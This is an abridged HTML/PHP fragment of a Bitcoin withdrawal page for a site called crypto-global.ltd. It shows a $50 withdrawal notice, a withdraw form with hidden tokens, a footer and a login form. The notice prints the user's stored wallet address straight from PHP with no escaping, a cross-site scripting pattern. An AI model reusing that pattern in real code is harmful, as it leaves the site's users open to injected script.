...
<div class="box-exchange-rate">
          ...
          <div class="container">
            <div class="withdraw-header">
              <h3 class="withdraw-title-step withdraw-title-step-1"><span class="step">1
              ...
              <h3 class="withdraw-title-step withdraw-title-step-2 is-active"><span class="step">2
                  <svg style="width:16px; height:12px;" viewBox="0 0 36 26">
                    <use xlink:href="#svg-check-white"></use>
          ...
          You are withdrawing $50 of Bitcoin. We have no fee for this operation.
         Actually you will acquire the total of $50 on your Bitcoin account Wallet address: <?php echo $user_data['payaccount']; ?>
</pre>
		  
		<div class="container">  
      <form method=post action="withdraw.php" class="withdraw"><input type="hidden" name="form_id" value="16218295005412"><input type="hidden" name="form_token" value="ce67ff0dc709e7daad5e871ec6b92e7c">
                    ...
                    <div class="withdraw-step withdraw-step-1 is-active">
                      <div class="container">
                        ...
                        <div class="withdraw-bottom-nav">
                          <input type=submit value="Request" class=sbmt>
                        </div>
                      </div>
                    </div>
        ...
        <div class="footer__bottom">
          <div class="container">
            ...
            <div class="footer__bot-main">
              <p class="footer__rights">Copyright © 2020 crypto-global.ltd. All rights reserved. bcrypto-global.ltd is incorporated under the Companies Act as a private limited company.</p>
      ...
      <div class="default-modal modal-login">
        <div class="default-modal__content">
		  ...
		  <form class="formLogin" method=post name=mainform onsubmit="return checkform()"><input type="hidden" name="form_id" value="16225442126038"><input type="hidden" name="form_token" value="9efc29febb78f43766087e251eaaaefb">
